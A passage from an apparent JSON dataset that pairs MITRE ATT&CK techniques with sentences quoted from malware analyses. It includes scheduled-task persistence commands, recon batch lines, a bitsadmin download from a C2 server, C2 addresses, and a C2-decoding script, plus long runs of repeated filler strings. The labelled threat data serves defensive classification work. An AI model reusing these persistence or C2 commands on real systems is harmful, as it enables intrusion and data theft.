    "For newer operating systems, events.exe creates task.xml as follows:  Then it creates a Windows scheduled task using the following command:       schtasks.exe /create /TN \\\"Events\\\\CacheTask_<user_name_here>\" /XML \\\"<event_cache_dir_path>t /F\"     At the system registry level, modules achieve persistence by adding themselves into the key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit when it finds possible add values to the Winlogon subkey, and in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager",
    "In addition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task",
    "After execution of every task, the malware sleeps for one minute before executing the next task",
    "The main similarities include the use of a scheduled task to persistently execute on the system, as well as the same general process to communicate with its C2 server",
    "With the Trojan moved its final location, it will then create a scheduled task to run a VBScript to make sure it runs persistently",
    "The decoded string from the Sch resource is: SchTasks /Create /SC MINUTE /MO 3 /TN \u201c%n%\u201d /TR \u201cwscript %path%\u201d /f The decoded string from the VBS resource is: CreateObject(\u201cWScript.Shell\u201d).Run(\u201c%app%\u201d) The %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin",
    "This differs from the previous OopsIE variant that used a hardcoded task name for the scheduled task",
    "This process ultimately attempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled task as it does not include a main loop to continue its execution",
    "After creating this scheduled task for persistence, the Trojan will begin communicating with its C2 server",
    "A scheduled task is also generated to maintain persistence of the payload",
    "Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host",
    "The malware component, test.exe, uses the Windows command \"cmd.exe\" /C whoami\u201d to verify it is running with the elevated privileges of \u201cSystem\u201d and creates persistence by creating the following scheduled task: \u00a0\u00a0\u00a0 schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON \u00a0\u00a0\u00a0 /ru \"System\" When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913",
    "The malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems",
    "This DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot",
    "They use At.exe to schedule tasks to run self-extracting RAR archives, which install either HttpBrowser or PlugX",
    "Another batch script run by a scheduled task renames the archives on the file server (see Figure 15)",
    "The scripts create scheduled tasks and also retrieve, decode, and execute a copy of Revenge RAT",
    "Figure 1: Code from 29[.]html scheduling the first task to run a script from pastebin The second task (\u201cMSOFFICEER\u201d) in Figure 2 runs the script contents of a different page of the same blog, blog-page[.]html, every 100 minutes",
    "The spreadsheet also creates a scheduled task named \"windows update check\" that runs the file C:\\Users\\<user_name>\\.templates\\System Manager.exe every minute.",
    "When the trojan starts up it will attempt to install a scheduled task with the name of \u201cJava Maintenance64\u201d to keep itself running.",
    "The campaigns maintain persistence on machines by creating two daily scheduled task entries.",
    "The script writes files to the path % appdata %\\Roaming\\Microsoft\\Templates\\, then creates two task entries triggered to run daily.",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    " scheduled task",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "sch.exe",
    "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)"
  ],
  "windows management instrumentation timestomp masquerading file and directory discovery data staged data encrypted-multi": {
    "technique_names": [
      "windows management instrumentation",
      "indicator removal on host: timestomp",
      "masquerading",
      "file and directory discovery",
      "data staged",
      "data encrypted for impact"
    ],
    "sentances": [
      "Command Description   search Searches for corresponding files   search&upload Encrypts and adds the corresponding files to the upload directory with the provided name   uploadfile Encrypts and adds the specified file to the upload directory with the provided name   uploadfolder Encrypts and adds the mentioned directory to the upload directory with the provided name   shellexecute Silently executes received command with cmd.exe   wmic Silently executes received command with wmic.exe (for WMI commands)   sendIEPass Encrypts and adds all gathered browser data into files for upload to C2   uninstall Removes files, directory and BITS tasks    Cryptography To decrypt the configuration data, the malware uses XOR with 25-character keys such as \u201cwaEHleblxiQjoxFJQaIMLdHKz\u201d that are different for every sample"
    ]
  },
  "standard application layer protocol exfiltration over command and control channel-multi": {
    "technique_names": [
      "application layer protocol",
      "exfiltration over c2 channel"
    ],
    "sentances": [
      "Probably full and active window screenshot quality   captureActiveQC 40   CaptureSites VPN*0,0 Login*0,0 mail*0,0 Security*0,0 Window titles of interest for screenshots, using left mouse button and Enter keypress hook   important upLog.txt upSCRLog.txt upSpecial.txt upFile.txt upMSLog.txt List of files to send to C2 using bitsadmin.exe from the dedicated thread   maxUpFileSizeKByte 1000000 Maximum size of file uploaded to C2   Servers http://108.61.189.174 Control server HTTP URL   ZipPass KtJvOXulgibfiHk Password for uploaded zip archives   browserPasswordCheckTimeout 300000 Milliseconds to wait between gathering key3.db, cookies.sqlite and other browser files in dedicated thread    Most of the parameters are self-explanatory"
    ]
  },
  "screen capture clipboard data-multi": {
    "technique_names": ["screen capture", "clipboard data"],
    "sentances": [
      "It sets keyboard and mouse hooks to its handlekeys() and MouseHookProc() functions respectively and starts several working threads:    ID Thread description   1 Gets commands from C2 and saves them to a file and system registry using the bitsadmin.exe utility   2 Decrypts command from registry using RC4 with a hardcoded key, and executes it   3 Transfers screenshots from the clipboard to \\Cache005 subdirectory and Unicode text from clipboard to log.txt, XOR-ed with the \u201csalamati\u201d key (\u201chealth\u201d in Farsi)   4 Transfers screenshots to \\Cache005 subdirectory with captureScreenTimeOut and captureScreenTimeOut frequencies   5 Checks network connection, encrypts and sends gathered logs   6 Unhooks mouse and keyboard, removes bitsadmin task   7 Checks if malware\u2019s working directory size already exceeds its threshold   8 Gathers victim\u00b4s credentials, visited website cache, decrypted Chrome login data, as well as Firefox databases with cookies, keys, signons and downloads    The malware uses the following command to receive data from its C2:       bitsadmin.exe /TRANSFER HelpCenterDownload /DOWNLOAD /PRIORITY normal <server> <file>http://<server_config>/asp.asp?ui=<host_name>nrg-<adapter_info>-<user_name>     Activity logging module (Splitter.exe) This module is called from the main thread to obtain screenshots of windows whose titles are specified in the configuration CaptureSites field, bitmaps and text from clipboard, etc"
    ]
  },
  "screen capture clipboard data data compressed data encoding data encrypted-multi": {
    "technique_names": [
      "screen capture",
      "clipboard data",
      "archive collected data",
      "data encoding",
      "data encrypted for impact"
    ],
    "sentances": [
      "Specifies the screen coordinates to take   -zip Name of password (from configuration data) protected zip archive   -clipboard Screenshot file name where a bitmap from the clipboard is saved in Cache005 subdirectory, zipped with password from configuration    Data exfiltration Exfiltration is done through the bitsadmin.exe utility"
    ]
  },
  "phishing: spearphishing link": [
    "Cyber threat groups\u2019 access to the media organization\u2019s networks could potentially provide the government advance warning on upcoming protests, information on pro-democracy group leaders, and insights needed to disrupt activity on the Internet, such as what occurred in mid-2014 when several websites were brought down in denial of service attacks.[8] Threat Actors Use Spear Phishing Written in Traditional Chinese Script in Attempted Intrusions In August 2015, the threat actors sent spear phishing emails to a number of Hong Kong-based media organizations, including newspapers, radio, and television",
    "On occasions, the phishing emails contained links to external domains to download the first stage, and sometimes the first stage was attached to the email itself",
    "These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files",
    "The first link was labeled as \"Comparison of Major Tasks in '16 & '17\" and the second link was identified as \"Comparison between '16 & '17\".Upon opening these links the user was presented with a further decoy Hangul document",
    "It is highly likely the adversary then used spear-phishing attacks containing links to these malicious documents as a delivery mechanism",
    "Group123 Links?  As we explore the Korean malware landscape, we always have burning questions relating to any possible links with Group123",
    "It\u2019s important to remember, that while we were using Bitly links to help gauge click location, anyone who clicks these links (including researchers) are also counted",
    "email with an embedded tracking link",
    "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016)\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)"
  ],
  "masquerading spearphishing attachment web service-multi": {
    "technique_names": [
      "masquerading",
      "phishing: spearphishing attachment",
      "web service"
    ],
    "sentances": [
      "LOWBALL Malware Analysis The spear phishing emails contained three attachments in total, each of which exploited an older vulnerability in Microsoft Office (CVE-2012-0158):  MD5  Filename  b9208a5b0504cb2283b1144fc455eaaa  \u4f7f\u547d\u516c\u6c11\u904b\u52d5 \u6211\u5011\u7684\u7570\u8c61.doc  ec19ed7cddf92984906325da59f75351  \u65b0\u805e\u7a3f\u53ca\u516c\u4f48.doc  6495b384748188188d09e9d5a0c401a4  (\u4ee3\u767c)[\u91c7\u8a2a\u901a\u77e5]\u6e2f\u5927\u6821\u53cb\u95dc\u6ce8\u7d44\u905e\u4fe1\u884c\u52d5.doc   In all three cases, the payload was the same:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  time.exe   This backdoor, known as LOWBALL, uses the legitimate Dropbox cloud-storage service to act as the CnC server"
    ]
  },
  "system service discovery remote file copy powershell-multi": {
    "technique_names": [
      "system service discovery",
      "ingress tool transfer",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "We observed the threat group issue the following commands:  @echo off\u00a0  \u00a0dir c:\\ >> %temp%\\download\u00a0  \u00a0ipconfig /all >> %temp%\\download\u00a0  \u00a0net user >> %temp%\\download\u00a0  \u00a0net user /domain >> %temp%\\download\u00a0  \u00a0ver >> %temp%\\download\u00a0  \u00a0del %0\u00a0\u00a0  @echo off\u00a0  \u00a0dir \"c:\\Documents and Settings\" >> %temp%\\download\u00a0  \u00a0dir \"c:\\Program Files\\\u00a0  \u00a0\" >> %temp%\\download\u00a0  \u00a0net start >> %temp%\\download\u00a0  \u00a0net localgroup administrator >> %temp%\\download\u00a0  \u00a0netstat -ano >> %temp%\\download   These commands allow the threat group to gain information about the compromised computer and the network to which it belongs"
    ]
  },
  "standard application layer protocol system network configuration discovery-multi": {
    "technique_names": [
      "application layer protocol",
      "system network configuration discovery"
    ],
    "sentances": [
      "This particular sample connected to the CnC domain accounts.serveftp[.]com, which resolved to an IP address previously used by the threat group, although the IP had not been used for some time prior to this most recent activity:  MD5      0beb957923df2c885d29a9c1743dd94b  accounts.serveftp.com  59.188.0.197   BUBBLEWRAP is a full-featured backdoor that is set to run when the system boots, and can communicate using HTTP, HTTPS, or a SOCKS proxy",
      "The code obtains the external IP address via an HTTP request using to \u201chttp://checkip.dyndns.org/\u201d and uses a regular expression to locate an IP address from the HTTP response",
      "The payload will use a specific regular expressions dependent on the type of DNS query was used to obtain the command string, which can be seen in Table 2:    DNS TYPE Regex Pattern   A Address:\\s+(\\d+.\\d+.\\d+.\\d+)   AC \\d+-\\d+-(\\d+)-([\\w\\d+/=]+)-\\d-.ac.$Global:domain   AAAA Address:\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\w|:]+){1,8})   CNAME,MX,TXT,SRV,SOA (\\d+)-([\\w\\d/=+]{0,})\\-.$Global:domain    Table 2 Types of responses provided by C2 These regular expressions are used to build strings that the payload will then subject to its command handler"
    ]
  },
  "scripting remote file copy-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "ingress tool transfer"
    ],
    "sentances": [
      "The malware beacons to this directory using the hardcoded API token and attempts to download these files (which are deleted from the Dropbox account after the download):  upload.bat, a batch script that the compromised machine will execute upload.rar, a RAR archive that contains at least two files: a batch script to execute, and often an executable (sometimes named rar.exe) \u00a0which the batch script will run and almost always uploads the results of download.rar to the cloud storage account silent.txt and period.txt, \u00a0small files sizes of 0-4 bytes that dictate the frequency to check in with the CnC  The threat actor will then download the results and then delete the files from the cloud storage account",
      "We are unsure of the shellcode hosted at this URL, but it is possible that additional shellcode-based payloads like Meterpreter could have been served by this shellcode",
      "Command   Description    0x31  Fingerprint System via WMI and Registry    0x32  Drop File and execute    0x33  Remote Shell    0x34  Terminate connection with C2    0x35  Download and run batch script    0x36  Download file on machine    0x37  Upload File    Table 2: FELIXROOT backdoor commands Figure 9 shows the log message decrypted from memory using the same mechanism shown in Figure 6 and Figure 7 for every command executed",
      "Here is the content of the file: /shellcode <90909090909090909090E800<...redacted\u2026>4D2D6DC95CBD5DC1811111111111111> def <7B0D0A2756...redacted\u2026>312067657420636C6F736566696C650D0A717569740D0A7D> token pop exch pop Exec  The executed shellcode will first perform a decoding routine designed to download an additional payload from the internet"
    ]
  },
  "masquerading shortcut modification-multi": {
    "technique_names": [
      "masquerading",
      "boot or logon autostart execution: shortcut modification"
    ],
    "sentances": [
      "Comnie, first named by Sophos seemingly after the Windows LNK file name it created, is a custom malware family that is used in targeted attacks, and has been observed in the wild since at least April 2013",
      "A shortcut file is generated in the following path:  %TEMP%\\~Update.lnk  This \u2018~Update.lnk\u2019 file is then copied to a filename of \u2018Windows help.lnk\u2019, which is placed in the startup path previously identified",
      "Again, a shortcut file is written to the %TEMP% path with a name of \u2018~Update.lnk\u2019, which is in turn copied to the identified startup path with a filename of \u2018Windows help.lnk\u2019"
    ]
  },
  "disabling security tools windows admin shares-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "remote services: smb/windows admin shares"
    ],
    "sentances": [
      "Original File Name Translation Decoy Location Most Likely Target   1060315 \u672c\u90e8\u767c\u8a00\u53c3\u8003.doc 1060315 Headquarters Speech Reference.doc Defense Industry Development Strategy TW Defense   \u8f49\u7d66\u82e6\u903c\u7684\u7db2\u7ba1\u5144\u5f1f.doc Passing to cool fellow network administrators.doc Network administration jokes TW High Tech Telecommunication     2.SC OAM Firewall Policy_0306.xls 2.SC OAM Firewall Policy_0306.xls Network topology diagrams TW High Tech Telecommunication    \u00a0  Figure 3 Decoy document discussing Taiwan\u2019s defense industry development strategy  Figure 4 Network firewall configuration description for a telecommunication company in Taiwan \u00a0  Figure 5 Decoy document providing network topology information \u00a0 It is worth noting that in the attack that made use of the decoy document in Figure 4, the attacker also included related firewall logs and appears to have originated from a compromised an IT service vendor"
    ]
  },
  "rundll32 shortcut modification-multi": {
    "technique_names": [
      "system binary proxy execution: rundll32",
      "boot or logon autostart execution: shortcut modification"
    ],
    "sentances": [
      "The built-in Windows utility rundll32.exe is then used to load this DLL by the original .lnk file",
      "This shortcut file points to \u2018C:\\Windows\\system32\\rundll32.exe \u201c%APPDATA%\\cnagnt.dll\u201d,Sd\u2019    One of the exceptions to the installation routine above is in the event Symantec is detected"
    ]
  },
  "obfuscated files or information: binary padding": [
    "A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk",
    "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) "
  ],
  "process injection dll search order hijacking file deletion dll side-loading-multi": {
    "technique_names": [
      "process injection",
      "hijack execution flow: dll search order hijacking",
      "indicator removal on host: file deletion",
      "hijack execution flow: dll side-loading"
    ],
    "sentances": [
      "If running with administrator privileges on a 32-bit host:  Copy the temporary DLL in %TEMP% to %WINDOWS%\\LINKINFO.dll   Otherwise:  Copy the temporary DLL in %TEMP% to %APPDATA%\\cnagnt.dll Delete the temporary DLL in %TEMP% Write a \u2018Conime.lnk\u2019 file in the user\u2019s startup path"
    ]
  },
  "deobfuscate/decode files or information exfiltration over command and control channel exfiltration over alternative protocol-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "exfiltration over c2 channel",
      "exfiltration over alternative protocol"
    ],
    "sentances": [
      "The results of the decoded data may be seen below: \u00a0  Figure 13 Decrypted information The decrypted data contains URLs for various online services that will be used by the attacker for downloading data that will contain the command and control (C2) server(s) and port(s) to be used by Comnie"
    ]
  },
  "web service exfiltration over command and control channel-multi": {
    "technique_names": ["web service", "exfiltration over c2 channel"],
    "sentances": [
      "Comnie will make requests to these URLs, looking for base64-encoded data after an identifier of \u2018magnet:/\u2019, as seen in the example below: Figure 14 GitHub storing Comnie C2 information In the example above, the C2 information is being stored within the user\u2019s URL parameter within GitHub"
    ]
  },
  "custom cryptographic protocol exfiltration over alternative protocol data encrypted-multi": {
    "technique_names": [
      "encrypted channel",
      "exfiltration over alternative protocol",
      "data encrypted for impact"
    ],
    "sentances": [
      "The prior example decrypts to the following: mailto:121.126.211[.]94:8080;80;80 \u00a0 The following Python script may be used to decode the C2 data used by the newest Comnie variant:      12345678910111213141516171819202122232425262728293031323334353637383940  import base64import sysimport refrom string import maketransfrom struct import *import requestsdef rc4_crypt(data, key):\u00a0\u00a0S = range(256)\u00a0\u00a0j = 0\u00a0\u00a0out = []\u00a0\u00a0for i in range(256):\u00a0\u00a0\u00a0\u00a0j = (j + S[i] + ord( key[i % len(key)] )) % 256\u00a0\u00a0\u00a0\u00a0S[i] , S[j] = S[j] , S[i]\u00a0\u00a0i = j = 0\u00a0\u00a0for char in data:\u00a0\u00a0\u00a0\u00a0i = ( i + 1 ) % 256\u00a0\u00a0\u00a0\u00a0j = ( j + S[i] ) % 256\u00a0\u00a0\u00a0\u00a0S[i] , S[j] = S[j] , S[i]\u00a0\u00a0\u00a0\u00a0out.append(chr(ord(char) ^ S[(S[j] + S[i]) % 256]))\u00a0\u00a0return ''.join(out)def decode(data):\u00a0\u00a0o = \"\"\u00a0\u00a0for d in data:\u00a0\u00a0\u00a0\u00a0od = ord(d)\u00a0\u00a0\u00a0\u00a0o += chr((4 * (16 * od | od & 0xC) | (((od >> 4 | od & 0x30) >> 2))) & 0xFF)\u00a0\u00a0return obase64fixTable = maketrans(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[::-1], \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\");def trans(string):\u00a0\u00a0return str(string).translate(base64fixTable)def altdecode(string):\u00a0\u00a0return base64.b64decode(trans(string))req = requests.get(sys.argv[1])fd = req.textoriginal_data = re.search(\"magnet:/\\?([^\\?]+)\\?\", fd).group(1)parsed_data = altdecode(original_data)dataLength = unpack(\"<I\", parsed_data[64:68])[0]key = decode(parsed_data[0:64])data = parsed_data[dataLength*-1:]d = rc4_crypt(data, key)print(d)     \u00a0 Comnie will make attempts at connecting to the IP address above using the various ports specified"
    ]
  },
  "system service discovery": [
    "Using this example, Comnie will then request data to supply to the BAT script, via the following decrypted request: h=HOSTNAME-PC&f=gethostinfo.bat&c=& Based on network traffic witnessed, the remote C2 server was found to respond with the following information:       netstat -ano > %TEMP%\\info.datipconfig /all >> %TEMP%\\info.datroute PRINT >> %TEMP%\\info.datnet view >> %TEMP%\\info.dattasklist >> %TEMP%\\info.datnet user >> %TEMP%\\info.datnet start >> %TEMP%\\info.dat     \u00a0 This script is written to a temporary file prior to be executed",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    "tasklist /svc ",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    " sc query",
    "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
  ],
  "hide artifacts: hidden files and directories": [
    "The final part of the VBA script changes the properties of these two files, setting their attributes to Hidden",
    "The locations:  For root user  path: /Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/ processname: screenassistantd  For regular user  path: ~/Library/Spelling/ processname: spellagentd Subsequently, it implements the Loader::installLoader method, reading the hardcoded 64-bit Mach-O executable (magic value 0xFEEDFACF), and writing to the previously determined path and file",
    "At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\\ProgramData\\Apple\\Update\\, likely as a ruse",
    "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files."
  ],
  "spearphishing link security software discovery user execution-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "software discovery: security software discovery",
      "user execution"
    ],
    "sentances": [
      "CoverageAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.IOCsFilesOffice Documents:c4be15f9ccfecf7a463f3b1d4a17e7b4f95de939e057662c3f97b52f7fa3c52fe5511b22245e26a003923ba476d7c36029939b2d1936e17a9b35b396467179aeefb235776851502672dba5ef45d96cc65cb9ebba1b49949393a6a85b9c822f52Seduploader Dropper:522fd9b35323af55113455d823571f71332e53dde988c2eb41395cf6b0c15805Sedupload Payload:ef027405492bc0719437eb58c3d2774cc87845f30c40040bbebbcc09a4e3dd18NetworksCC:myinvestgroup[.]com"
    ]
  },
  "file and directory discovery obfuscated files or information-multi": {
    "technique_names": [
      "file and directory discovery",
      "obfuscated files or information"
    ],
    "sentances": [
      "ActiveMime Lure Files  MD5  2017\u5e74\u5458\u5de5\u5de5\u8d44\u6027\u6d25\u8d34\u989d\u7edf\u8ba1\u62a5\u544a.doc (2017\u00a0Statistical Report on Staff\u00a0Salary\u00a0and Allowances) 5458a2e4d784abb1a1127263bd5006b5  Thong tin.doc (Information) ce50e544430e7265a45fab5a1f31e529  Phan Vu Tutn CV.doc  4f761095ca51bfbbf4496a4964e41d4f  Ke hoach cuu tro nam 2017.doc (2017 Bailout Plan) e9abe54162ba4572c770ab043f576784  Instructions to GSIS.doc  fba089444c769700e47c6b44c362f96b  Hoi thao truyen thong doc lap.doc (Traditional Games) f6ee4b72d6d42d0c7be9172be2b817c1\u00a0  Gi\u1ea5y y\u00eau c\u1ea7u b\u1ed3i th\u01b0\u1eddng m\u1edbi 2016 - h\u1eb1ng.doc (New 2016 Claim Form) aa1f85de3e4d33f31b4f78968b29f175  Hoa don chi tiet tien no.doc (Debt Details) 5180a8d9325a417f2d8066f9226a5154  Thu moi tham du Hoi luan.doc (Collection of Participants) f6ee4b72d6d42d0c7be9172be2b817c1  Danh sach nhan vien vi pham ky luat.doc (List of Employee Violations) 6baafffa7bf960dec821b627f9653e44  No\u0323\u0302i-dung-qua\u0309ng-ca\u0301o.doc (Internal Content Advertising) 471a2e7341f2614b715dc89e803ffcac  H\u0110 DVPM-VTC 31.03.17.doc  f1af6bb36cdf3cff768faee7919f0733   Table 2: Sampling of APT32 Lure Files The Base64 encoded ActiveMime data also contained an OLE file with malicious macros"
    ]
  },
  "scheduled task scripting-multi": {
    "technique_names": [
      "scheduled task/job",
      "command and scripting interpreter"
    ],
    "sentances": [
      "Once macros were enabled on the target system, the malicious macros created two named scheduled tasks as persistence mechanisms for two backdoors on the infected system",
      "cUpdateCheckers.bat is launched and creates a scheduled task for GoogleUpdateschecker.vbs persistence"
    ]
  },
  "masquerading scripting-multi": {
    "technique_names": ["masquerading", "command and scripting interpreter"],
    "sentances": [
      "The second named scheduled task, loaded as an XML file to falsify task attributes, ran a JavaScript code block that downloaded and launched a secondary backdoor, delivered as a multi-stage PowerShell script",
